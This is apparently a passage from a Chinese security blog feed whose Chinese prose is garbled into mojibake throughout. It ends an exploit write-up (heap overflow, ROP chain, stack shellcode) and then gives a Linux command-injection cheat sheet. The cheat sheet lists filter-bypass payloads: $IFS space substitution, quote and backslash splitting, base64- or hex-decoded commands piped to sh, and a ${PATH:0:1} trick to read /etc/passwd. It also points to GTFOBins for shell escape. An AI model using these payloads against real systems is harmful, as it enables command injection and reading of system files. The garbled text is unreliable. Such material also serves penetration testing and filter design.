<p>ç¨‹åºå†…å­˜å¸ƒå±€æ¯”è¾ƒç‰¹æ®Šï¼Œbss åŒºåŸŸåé¢ç´§è·Ÿç€ heap åŒºåŸŸï¼Œæ‰€ä»¥å¯ä»¥å°†å…¨å±€å˜é‡çš„æº¢å‡ºè½¬å˜ä¸ºå †æº¢å‡ºï¼Œå¦å¤–å †ä¸­åˆä¿å­˜äº† xmlSAXHandler ç»“æ„ï¼Œå¯ä»¥å°†å…¶ä¸­çš„ handler æŒ‡é’ˆè¦†ç›–ï¼Œä»è€ŒåŠ«æŒæ§åˆ¶æµã€‚</p>
<p>exp ä½œè€…é€šè¿‡å·§å¦™çš„æ„é€ ï¼Œå°†æ§åˆ¶æµé¦–å…ˆåŠ«æŒåˆ° ret 0x90c6ï¼Œç”±äºä¼ å…¥çš„ POST æ•°æ®ä¹Ÿä¼šä½äºæ ˆä¸Šï¼Œé€šè¿‡ç²¾å¿ƒæ§åˆ¶åç§»ï¼Œå¯ä»¥å°†ç¨‹åºåŠ«æŒåˆ° ROP é“¾ä¸Šï¼Œä»è€Œå°†æŒ‡é’ˆè¦†ç›–è½¬æ¢ä¸ºæ ˆæº¢å‡ºåˆ©ç”¨æ‰‹æ³•ã€‚</p>
<p>ROP é“¾ä¸­åˆæ„é€ å‡ºèƒ½å¤Ÿç›´æ¥å°†æ§åˆ¶æµè½¬ç§»åˆ°æ ˆä¸Šçš„ gadgetï¼Œé¿å…äº†éœ€è¦çˆ†ç ´åœ°å€çš„é—®é¢˜ã€‚ç”±äºæ ˆå…·æœ‰å¯æ‰§è¡Œæƒé™ï¼Œé€šè¿‡æ§åˆ¶åç§»å³å¯è·³è½¬åˆ° shellcode ä¸Šæ‰§è¡Œã€‚</p>
<p>shellcode ä¸­æ„é€  syscall å°† python ä»£ç å†™å…¥æœ¬åœ°æ–‡ä»¶å¹¶æ‰§è¡Œï¼Œè§£å†³äº† &#x2F;tmp mount ä¸º noexec çš„é—®é¢˜ã€‚</p>
<p>å¾ˆå¤šå®Œç¾çš„å†…å­˜å¸ƒå±€é™ä½äº†å¼€å‘åˆ©ç”¨ä»£ç çš„éš¾åº¦ï¼ŒåŠ ä¸Šä½œè€…å·§å¦™çš„åˆ©ç”¨æ‰‹æ®µï¼Œä½¿å¾—æ­¤ exp ç¨³å®šæ€§è¾ƒé«˜ï¼Œå±å®³è¾ƒå¤§ã€‚</p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
  </entry>
  <entry>
    <title>Linux å‘½ä»¤æ³¨å…¥å¤‡å¿˜å½•</title>
    <url>/2022/03/21/command-inject/</url>
    <content><![CDATA[<p>Linux ä¸‹å‘½ä»¤æ³¨å…¥æ–¹å¼æ€»ç»“å’Œå¸¸è§è¿‡æ»¤ç»•è¿‡å¤‡å¿˜å½•</p>
<span id="more"></span>

<h2 id="SHELL-å¸¸ç”¨å­—ç¬¦"><a href="#SHELL-å¸¸ç”¨å­—ç¬¦" class="headerlink" title="SHELL å¸¸ç”¨å­—ç¬¦"></a>SHELL å¸¸ç”¨å­—ç¬¦</h2><h3 id=""><a href="#" class="headerlink" title="|"></a>|</h3><p>ç®¡é“ç¬¦å·ï¼Œå°†ä¸Šä¸€æ¡æŒ‡ä»¤çš„æ ‡å‡†è¾“å‡ºä½œä¸ºä¸‹ä¸€æ¡æŒ‡ä»¤çš„æ ‡å‡†è¾“å…¥</p>
<p>æ­£åˆ™è¡¨è¾¾å¼ä¸­è¡¨ç¤º â€œæˆ–è€…â€</p>
<h3 id="amp"><a href="#amp" class="headerlink" title="&amp;"></a>&amp;</h3><p>å°†ä¸€æ¡å‘½ä»¤æ”¾åœ¨åå°æ‰§è¡Œï¼Œæˆ–è¡¨ç¤ºæ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡º</p>
<h3 id="-1"><a href="#-1" class="headerlink" title="||"></a>||</h3><p>è¡¨ç¤º â€œæˆ–è€…â€ï¼Œè¿æ¥ä¸¤æ¡å‘½ä»¤ï¼Œå½“å‰ä¸€æ¡å‘½ä»¤æ‰§è¡Œå¤±è´¥åé¢çš„å‘½ä»¤æ‰ä¼šæ‰§è¡Œ</p>
<h3 id="amp-amp"><a href="#amp-amp" class="headerlink" title="&amp;&amp;"></a>&amp;&amp;</h3><p>è¡¨ç¤º â€œå’Œâ€ï¼Œå½“å‰ä¸€æ¡å‘½ä»¤æ‰§è¡ŒæˆåŠŸåé¢çš„å‘½ä»¤æ‰ä¼šæ‰§è¡Œ</p>
<h3 id="-2"><a href="#-2" class="headerlink" title=";"></a>;</h3><p>åˆ†å·æ‹¼æ¥è¿ç»­å‡ æ¡å‘½ä»¤ï¼Œå°±ç®—å‰é¢çš„å‘½ä»¤æ‰§è¡Œå¤±è´¥åé¢ä¹Ÿä¼šæ‰§è¡Œ</p>
<h3 id="-3"><a href="#-3" class="headerlink" title="$"></a>$</h3><p>ç¾å…ƒç¬¦å·ç”¨æ¥è·å–å˜é‡çš„å€¼</p>
<h3 id="-4"><a href="#-4" class="headerlink" title="()"></a>()</h3><p>ç»„åˆå‘½ä»¤æ‰§è¡Œï¼Œç§°ä¸ºæŒ‡ä»¤ç¾¤ç»„ï¼Œå¯ä»¥ç»“åˆåˆ†å·æ‰§è¡Œå¤šæ¡å‘½ä»¤</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">(<span class="built_in">ls</span> -la ; ifconfig)</span><br></pre></td></tr></table></figure></div>

<p>shell ä¸­é’ˆå¯¹æŒ‡ä»¤ç¾¤ç»„ä¼šäº§ç”Ÿ subshell æ‰§è¡Œ</p>
<h3 id="96"><a href="#96" class="headerlink" title="&#96;"></a>&#96;</h3><p>åå¼•å·è¡¨ç¤º â€œæŒ‡ä»¤æ›¿ä»£â€ï¼Œå°†åå¼•å·åŒ…è£¹çš„å‘½ä»¤è¾“å‡ºç»“æœä½œä¸ºå¦ä¸€ä¸ªæŒ‡ä»¤çš„è¾“å…¥</p>
<h3 id="-5"><a href="#-5" class="headerlink" title="$()"></a>$()</h3><p>ä¹Ÿè¡¨ç¤ºæŒ‡ä»¤æ›¿ä»£</p>
<h3 id="â€˜"><a href="#â€˜" class="headerlink" title="â€˜"></a>â€˜</h3><p>å•å¼•å·å°†åŒ…è£¹ä½çš„å†…å®¹è§†ä¸ºå­—ç¬¦ä¸²ï¼Œå…¶ä¸­ $ ç­‰ç¬¦å·ä¸ä¼šè¢«è¿›ä¸€æ­¥å¤„ç†</p>
<h3 id="â€œ"><a href="#â€œ" class="headerlink" title="â€œ"></a>â€œ</h3><p>åŒå¼•å·å’Œå•å¼•å·åŠŸèƒ½ç›¸åŒï¼Œä½†æ˜¯åŒå¼•å·åŒ…è£¹çš„å­—ç¬¦ä¸²ä¸­ $ ç­‰ç¬¦å·ä¼šè¢«æ‹“å±•ä¸ºå˜é‡</p>
<h3 id="-6"><a href="#-6" class="headerlink" title="(())"></a>(())</h3><p>è¿ç»­ä¸¤ä¸ªå°æ‹¬å·å¯ä»¥ç”¨æ¥è¿›è¡Œç®—æ•°è¿ç®—ï¼Œç±»ä¼¼ let æŒ‡ä»¤</p>
<h3 id="-7"><a href="#-7" class="headerlink" title="{}"></a>{}</h3><p>å¤§æ‹¬å·å¯ç”¨äºå­—ç¬¦ç»„åˆ</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> &#123;./te,st&#125;&#123;st,st&#125;</span><br></pre></td></tr></table></figure></div>
<p>æœ€ç»ˆä¼šç”Ÿæˆ</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> ./test</span><br><span class="line"><span class="built_in">cat</span> ./test</span><br><span class="line"><span class="built_in">cat</span> ./stst</span><br><span class="line"><span class="built_in">cat</span> ./stst</span><br></pre></td></tr></table></figure></div>

<p>å¦ç”¨äºå®ç°åŒ¿åå‡½æ•°</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">&#123; cmd1; cmd2; cmd3;&#125;</span><br></pre></td></tr></table></figure></div>
<p>ç¬¬ä¸€æ¡å‘½ä»¤å’Œå¤§æ‹¬å·ä¹‹é—´è¦æœ‰ç©ºæ ¼ï¼Œæ¯æ¡å‘½ä»¤åè¦æœ‰åˆ†å·</p>
<p>æ­£åˆ™è¡¨è¾¾å¼ä¸­è¡¨ç¤ºèŒƒå›´</p>
<h3 id="-8"><a href="#-8" class="headerlink" title="[]"></a>[]</h3><p>ä¸­æ‹¬å·å¸¸ç”¨äºæµç¨‹æ§åˆ¶ï¼Œèµ·åˆ¤æ–­ä½œç”¨ï¼Œåœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­è¡¨ç¤ºèŒƒå›´æˆ–è€…é›†åˆ</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> ./te[0-z]t</span><br></pre></td></tr></table></figure></div>

<p>ä½†ä¸­æ‹¬å·ä¸­ä¸èƒ½ä½¿ç”¨ &amp;&amp; ç­‰é€»è¾‘å­—ç¬¦</p>
<h3 id="-9"><a href="#-9" class="headerlink" title="[[]]"></a>[[]]</h3><p>åŒä¸­æ‹¬å·ç”¨äºå­—ç¬¦ä¸²æ¯”è¾ƒæµ‹è¯•ï¼Œå…è®¸åœ¨å…¶ä¸­ä½¿ç”¨ || &amp;&amp; ç­‰é€»è¾‘ç¬¦å·</p>
<h3 id="gt"><a href="#gt" class="headerlink" title="&gt;"></a>&gt;</h3><p>å¤§äºå·è¡¨ç¤ºè¾“å‡ºé‡å®šå‘ï¼Œå¦‚æœç›®æ ‡æ–‡ä»¶å·²ç»å­˜åœ¨åˆ™è¦†ç›–å…¶ä¸­çš„å†…å®¹</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;test&quot;</span> &gt; <span class="built_in">test</span></span><br></pre></td></tr></table></figure></div>

<p>shell ä¸­æä¾›äº†å«åš noclobber çš„ç‰¹æ€§ï¼Œå®ƒå¯ä»¥é˜²æ­¢é‡å®šå‘ä¸ç»æ„é—´ä¿®æ”¹äº†ç›®æ ‡æ–‡ä»¶ï¼Œæ‰“å¼€æ­¤ç‰¹æ€§åå¦‚æœè¿›è¡Œé‡å®šå‘è¦†ç›–æ–‡ä»¶ï¼Œshell ä¼šæŠ¥å‘Šé”™è¯¯è€Œä¸è¦†ç›–ç›®æ ‡æ–‡ä»¶ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">iot@ubuntu:~/Desktop$ set -o noclobber</span><br><span class="line">iot@ubuntu:~/Desktop$ echo &quot;overwrite&quot; &gt; test</span><br><span class="line">bash: testï¼šæ— æ³•è¦†ç›–å·²å­˜åœ¨çš„æ–‡ä»¶</span><br><span class="line">iot@ubuntu:~/Desktop$ set +o noclobber</span><br><span class="line">iot@ubuntu:~/Desktop$ echo &quot;overwrite&quot; &gt; test</span><br><span class="line">iot@ubuntu:~/Desktop$</span><br></pre></td></tr></table></figure></div>



<h3 id="lt"><a href="#lt" class="headerlink" title="&lt;"></a>&lt;</h3><p>å°äºå·è¡¨ç¤ºè¾“å…¥é‡å®šå‘</p>
<h3 id="gt-gt"><a href="#gt-gt" class="headerlink" title="&gt;&gt;"></a>&gt;&gt;</h3><p>åŒå¤§äºå·è¡¨ç¤ºè¾“å‡ºé‡å®šå‘è¿½åŠ </p>
<h3 id="lt-lt"><a href="#lt-lt" class="headerlink" title="&lt;&lt;"></a>&lt;&lt;</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd &lt;&lt; end</span><br></pre></td></tr></table></figure></div>



<p>åŒå°äºå·ä»æ ‡å‡†è¾“å…¥ä¸­è¯»å–è¾“å…¥ï¼Œç›´åˆ°é‡åˆ°æŒ‡å®šçš„å­—ç¬¦ä¸²(end)ç»“æŸ</p>
<p>å¦‚æœè¾“å…¥ä¸ä½¿ç”¨å¼•å·åŒ…è£¹ï¼Œåˆ™å‘½ä»¤ä¼šæ‰§è¡Œå˜é‡æ›¿æ¢ï¼Œå¦‚æœä½¿ç”¨ <strong>&lt;&lt;-</strong> ï¼Œåˆ™è¯»å–çš„æ—¶å€™ä¼šå¿½ç•¥æ¯è¡Œè¾“å…¥å‰é¢çš„ tab</p>
<h3 id="é€šé…ç¬¦"><a href="#é€šé…ç¬¦" class="headerlink" title="é€šé…ç¬¦"></a>é€šé…ç¬¦</h3><table>
<thead>
<tr>
<th align="left">å­—ç¬¦</th>
<th align="left">è§£é‡Š</th>
</tr>
</thead>
<tbody><tr>
<td align="left">*</td>
<td align="left">åŒ¹é…ä»»æ„é•¿åº¦ä»»æ„å­—ç¬¦</td>
</tr>
<tr>
<td align="left">?</td>
<td align="left">åŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦</td>
</tr>
<tr>
<td align="left">[list]</td>
<td align="left">åŒ¹é…æŒ‡å®šèŒƒå›´å†…ï¼ˆlistï¼‰ä»»æ„å•ä¸ªå­—ç¬¦ï¼Œä¹Ÿå¯ä»¥æ˜¯å•ä¸ªå­—ç¬¦ç»„æˆçš„é›†åˆ</td>
</tr>
<tr>
<td align="left">[^list]</td>
<td align="left">åŒ¹é…æŒ‡å®šèŒƒå›´å¤–çš„ä»»æ„å•ä¸ªå­—ç¬¦æˆ–å­—ç¬¦é›†åˆ</td>
</tr>
<tr>
<td align="left">[!list]</td>
<td align="left">åŒ<code>[^list]</code></td>
</tr>
<tr>
<td align="left">{str1,str2,â€¦}</td>
<td align="left">åŒ¹é… srt1 æˆ–è€… srt2 æˆ–è€…æ›´å¤šå­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥æ˜¯é›†åˆ</td>
</tr>
<tr>
<td align="left">IFS</td>
<td align="left">ç”± &lt; space &gt; æˆ– &lt; tab &gt; æˆ– &lt; enter &gt; ä¸‰è€…ä¹‹ä¸€ç»„æˆ</td>
</tr>
<tr>
<td align="left">CR</td>
<td align="left">ç”± &lt; enter &gt; äº§ç”Ÿ</td>
</tr>
<tr>
<td align="left">!</td>
<td align="left">æ‰§è¡Œ history ä¸­çš„å‘½ä»¤</td>
</tr>
</tbody></table>
<p>ä¸“ç”¨å­—ç¬¦é›†</p>
<table>
<thead>
<tr>
<th align="left">å­—ç¬¦</th>
<th align="left">æ„ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td align="left">[:alnum:]</td>
<td align="left">ä»»æ„æ•°å­—æˆ–è€…å­—æ¯</td>
</tr>
<tr>
<td align="left">[:alpha:]</td>
<td align="left">ä»»æ„å­—æ¯</td>
</tr>
<tr>
<td align="left">[:space:]</td>
<td align="left">ç©ºæ ¼</td>
</tr>
<tr>
<td align="left">[:lower:]</td>
<td align="left">å°å†™å­—æ¯</td>
</tr>
<tr>
<td align="left">[:digit:]</td>
<td align="left">ä»»æ„æ•°å­—</td>
</tr>
<tr>
<td align="left">[:upper:]</td>
<td align="left">ä»»æ„å¤§å†™å­—æ¯</td>
</tr>
<tr>
<td align="left">[:cntrl:]</td>
<td align="left">æ§åˆ¶ç¬¦</td>
</tr>
<tr>
<td align="left">[:graph:]</td>
<td align="left">å›¾å½¢</td>
</tr>
<tr>
<td align="left">[:print:]</td>
<td align="left">å¯æ‰“å°å­—ç¬¦</td>
</tr>
<tr>
<td align="left">[:punct:]</td>
<td align="left">æ ‡ç‚¹ç¬¦å·</td>
</tr>
<tr>
<td align="left">[:xdigit:]</td>
<td align="left">åå…­è¿›åˆ¶æ•°</td>
</tr>
<tr>
<td align="left">[:blank:]</td>
<td align="left">ç©ºç™½å­—ç¬¦</td>
</tr>
</tbody></table>
<p>ä½¿ç”¨ä¸“ç”¨å­—ç¬¦é›†ä¾‹å­ï¼Œæ³¨æ„è¦ç”¨åŒä¸­æ‹¬å·</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> ./te[[:alpha:]]t</span><br></pre></td></tr></table></figure></div>



<h3 id="é‡å®šå‘ç»„åˆåº”ç”¨"><a href="#é‡å®šå‘ç»„åˆåº”ç”¨" class="headerlink" title="é‡å®šå‘ç»„åˆåº”ç”¨"></a>é‡å®šå‘ç»„åˆåº”ç”¨</h3><ul>
<li>cmd &gt;| file  å’Œå•ä¸ªå¤§äºå·åŠŸèƒ½ç›¸åŒï¼Œä½†å®ƒå¯ä»¥å¿½ç•¥ noclobber çš„é™åˆ¶</li>
<li>:&gt; file  å°†æ–‡ä»¶æˆªæ–­ä¸º 0 é•¿åº¦ï¼Œæ–‡ä»¶ä¸å­˜åœ¨åˆ™åˆ›å»º</li>
<li>cmd &gt;&amp;n å°†å‘½ä»¤è¾“å‡ºåˆ°æ–‡ä»¶æè¿°ç¬¦ n</li>
<li>cmd m&gt;&amp;n æŠŠè¾“å‡ºåˆ°æ–‡ä»¶æè¿°ç¬¦ m çš„ä¿¡æ¯é‡å®šå‘åˆ° n</li>
</ul>
<h2 id="å­—ç¬¦è¿‡æ»¤ç»•è¿‡"><a href="#å­—ç¬¦è¿‡æ»¤ç»•è¿‡" class="headerlink" title="å­—ç¬¦è¿‡æ»¤ç»•è¿‡"></a>å­—ç¬¦è¿‡æ»¤ç»•è¿‡</h2><h3 id="ç©ºæ ¼"><a href="#ç©ºæ ¼" class="headerlink" title="ç©ºæ ¼"></a>ç©ºæ ¼</h3><ul>
<li>ç”¨ $IFS ç»•è¿‡</li>
</ul>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span><span class="variable">$IFStest</span></span><br><span class="line"><span class="built_in">cat</span><span class="variable">$&#123;IFS&#125;</span><span class="built_in">test</span></span><br><span class="line"><span class="built_in">cat</span>$IFS<span class="variable">$9test</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>ç”¨é‡å®šå‘ç¬¦å·ç»•è¿‡</li>
</ul>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span>&lt;<span class="built_in">test</span></span><br><span class="line"><span class="built_in">cat</span>&lt;&gt;<span class="built_in">test</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>bash ä¸­ä½¿ç”¨å¤§æ‹¬å·ç»•è¿‡</li>
</ul>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">&#123;<span class="built_in">cat</span>,./test&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>ç¯å¢ƒå˜é‡ç»•è¿‡</li>
</ul>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">iot@ubuntu:~/Desktop/test$ x=$<span class="string">&#x27;cat\x20test&#x27;</span>&amp;&amp;<span class="variable">$x</span></span><br><span class="line"><span class="built_in">test</span></span><br><span class="line">iot@ubuntu:~/Desktop/test$ x=$<span class="string">&#x27;cat\x09test&#x27;</span>&amp;&amp;<span class="variable">$x</span></span><br><span class="line"><span class="built_in">test</span></span><br></pre></td></tr></table></figure></div>



<h3 id="å…³é”®å­—ç»•è¿‡"><a href="#å…³é”®å­—ç»•è¿‡" class="headerlink" title="å…³é”®å­—ç»•è¿‡"></a>å…³é”®å­—ç»•è¿‡</h3><ul>
<li>ç”¨ $@</li>
</ul>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">c<span class="variable">$@at</span> ./test</span><br></pre></td></tr></table></figure></div>

<ul>
<li>ç”¨ç¯å¢ƒå˜é‡ç»•è¿‡</li>
</ul>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">x=c;y=a;z=t;$x$y<span class="variable">$z</span> <span class="built_in">test</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>ç”¨ç¼–ç ç»•è¿‡</li>
</ul>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. base64</span></span><br><span class="line">iot@ubuntu:~/Desktop/test$ <span class="built_in">echo</span> <span class="string">&quot;cat test&quot;</span> | <span class="built_in">base64</span></span><br><span class="line">Y2F0IHRlc3QK</span><br><span class="line">iot@ubuntu:~/Desktop/test$ <span class="built_in">echo</span> <span class="string">&quot;Y2F0IHRlc3QK&quot;</span> | <span class="built_in">base64</span> -d | sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. hex</span></span><br><span class="line">iot@ubuntu:~/Desktop/test$ <span class="built_in">echo</span> <span class="string">&quot;cat test&quot;</span> | xxd -ps</span><br><span class="line">63617420746573740a</span><br><span class="line">iot@ubuntu:~/Desktop/test$ <span class="built_in">echo</span> <span class="string">&quot;63617420746573740a&quot;</span> | xxd -r -p | sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. printf</span></span><br><span class="line"><span class="comment"># printf æ”¯æŒå¤šç§ç¼–ç è¾“å‡º</span></span><br><span class="line">iot@ubuntu:~/Desktop/test$ $(<span class="built_in">printf</span> <span class="string">&#x27;\154\163&#x27;</span>)</span><br><span class="line"><span class="built_in">test</span></span><br><span class="line">iot@ubuntu:~/Desktop/test$ $(<span class="built_in">printf</span> <span class="string">&#x27;\x6c\x73&#x27;</span>)</span><br><span class="line"><span class="built_in">test</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>å•å¼•å·å’ŒåŒå¼•å·</li>
</ul>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">iot@ubuntu:~/Desktop/test$ c<span class="string">&quot;a&quot;</span>t ./test</span><br><span class="line"><span class="built_in">test</span></span><br><span class="line">iot@ubuntu:~/Desktop/test$ <span class="built_in">cat</span> ./t<span class="string">&#x27;e&#x27;</span>st</span><br><span class="line"><span class="built_in">test</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>åæ–œçº¿</li>
</ul>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">iot@ubuntu:~/Desktop/test$ c\at ./t\e\st</span><br><span class="line"><span class="built_in">test</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>ç”¨ç¯å¢ƒå˜é‡ç»•è¿‡</li>
</ul>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ç»•è¿‡æ–œçº¿</span></span><br><span class="line"><span class="built_in">cat</span> <span class="variable">$&#123;PATH:0:1&#125;</span>etc<span class="variable">$&#123;PATH:0:1&#125;</span>passwd</span><br><span class="line"><span class="comment"># ç‰¹æ®Šå˜é‡</span></span><br><span class="line"><span class="variable">$&#123;IFS&#125;</span>  <span class="comment"># åˆ†éš”ç¬¦</span></span><br><span class="line"><span class="variable">$&#123;PS2&#125;</span>  <span class="comment"># &gt;</span></span><br><span class="line"><span class="variable">$&#123;PS4&#125;</span>  <span class="comment"># +</span></span><br><span class="line"><span class="variable">$&#123;9&#125;</span>    <span class="comment"># ç©º</span></span><br></pre></td></tr></table></figure></div>



<h2 id="å…¶ä»–ç‰¹æ®Šç”¨æ³•"><a href="#å…¶ä»–ç‰¹æ®Šç”¨æ³•" class="headerlink" title="å…¶ä»–ç‰¹æ®Šç”¨æ³•"></a>å…¶ä»–ç‰¹æ®Šç”¨æ³•</h2><p><strong>1. é—®å·</strong></p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> ./te??</span><br></pre></td></tr></table></figure></div>



<p><strong>2. []</strong></p>
<p>[â€¦] åŒ¹é…æ‹¬å·ä¸­çš„ä»»ä¸€ä¸ªå­—ç¬¦</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> ./te[abcdsf]t</span><br></pre></td></tr></table></figure></div>



<p><strong>3. {}</strong></p>
<p>{â€¦} åŒ¹é…å¤§æ‹¬å·ä¸­æ‰€æœ‰æ¨¡å¼</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> ./te&#123;a,e,s,t,f&#125;t</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> ./te&#123;a..z&#125;t</span><br></pre></td></tr></table></figure></div>



<p>[â€¦] å’Œ {â€¦} çš„åŒºåˆ«</p>
<p>[â€¦] å½“æ–‡ä»¶ä¸å­˜åœ¨æ—¶å®ƒä¼šå˜æˆæ™®é€šçš„å­—ç¬¦ä¸²</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">iot@ubuntu:~/Desktop$ <span class="built_in">cat</span> ./te[abcdf]t</span><br><span class="line"><span class="built_in">cat</span>: <span class="string">&#x27;./te[abcdf]t&#x27;</span>: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•</span><br></pre></td></tr></table></figure></div>

<p>è€Œ {â€¦} å½“æ–‡ä»¶ä¸å­˜åœ¨æ—¶ä¾ç„¶ä¼šå±•å¼€</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">iot@ubuntu:~/Desktop$ <span class="built_in">cat</span> ./te&#123;a,e,t,f&#125;t</span><br><span class="line"><span class="built_in">cat</span>: ./teat: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•</span><br><span class="line"><span class="built_in">cat</span>: ./teet: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•</span><br><span class="line"><span class="built_in">cat</span>: ./tett: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•</span><br><span class="line"><span class="built_in">cat</span>: ./teft: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•</span><br></pre></td></tr></table></figure></div>



<p><strong>4. é€šé…ç¬¦</strong></p>
<ul>
<li><p>? * ç­‰é€šé…ç¬¦ä¸èƒ½åŒ¹é… &#x2F;</p>
</li>
<li><p>å¯ä»¥åˆ›å»ºæ–‡ä»¶ååŒ…å«é€šé…ç¬¦çš„æ–‡ä»¶</p>
</li>
</ul>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">iot@ubuntu:~/Desktop$ <span class="built_in">touch</span> <span class="string">&#x27;tes*&#x27;</span></span><br><span class="line">iot@ubuntu:~/Desktop$ <span class="built_in">ls</span> tes*</span><br><span class="line"><span class="string">&#x27;tes*&#x27;</span>   <span class="built_in">test</span></span><br></pre></td></tr></table></figure></div>



<p><strong>5. æ˜Ÿå·</strong></p>
<p>ç›´æ¥æ‰§è¡Œ * ç›¸å½“äºæ‰§è¡Œ</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">$(<span class="built_in">dir</span> *)</span><br></pre></td></tr></table></figure></div>



<p><strong>6. alias</strong></p>
<p>alias è¦†ç›–æŒ‡ä»¤</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">iot@ubuntu:~/Desktop/test$ <span class="built_in">cat</span> <span class="built_in">test</span></span><br><span class="line"><span class="built_in">test</span></span><br><span class="line">iot@ubuntu:~/Desktop/test$ <span class="built_in">alias</span> <span class="built_in">cat</span>=<span class="string">&quot;pwd&quot;</span></span><br><span class="line">iot@ubuntu:~/Desktop/test$ <span class="built_in">cat</span> <span class="built_in">test</span></span><br><span class="line">/home/iot/Desktop/test</span><br></pre></td></tr></table></figure></div>



<h2 id="å‚æ•°æ³¨å…¥-x2F-rbash-escape"><a href="#å‚æ•°æ³¨å…¥-x2F-rbash-escape" class="headerlink" title="å‚æ•°æ³¨å…¥&#x2F;rbash escape"></a>å‚æ•°æ³¨å…¥&#x2F;rbash escape</h2><p><strong>Github å¼€æºé¡¹ç›® GTFOBins (<a class="link"   href="https://gtfobins.github.io/" >https://gtfobins.github.io/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>) æ€»ç»“äº†å¤§é‡ Linux ä¸‹å¯ç”¨äºé€ƒé€¸&#x2F;ææƒ&#x2F;æ‰§è¡Œå‘½ä»¤çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼ŒWindows ç¯å¢ƒä¸‹æœ‰ LOLBAS (<a class="link"   href="https://lolbas-project.github.io/" >https://lolbas-project.github.io/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>)</strong></p>
<p>æ£€æŸ¥å½“å‰ shell</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$SHELL</span></span><br></pre></td></tr></table></figure></div>



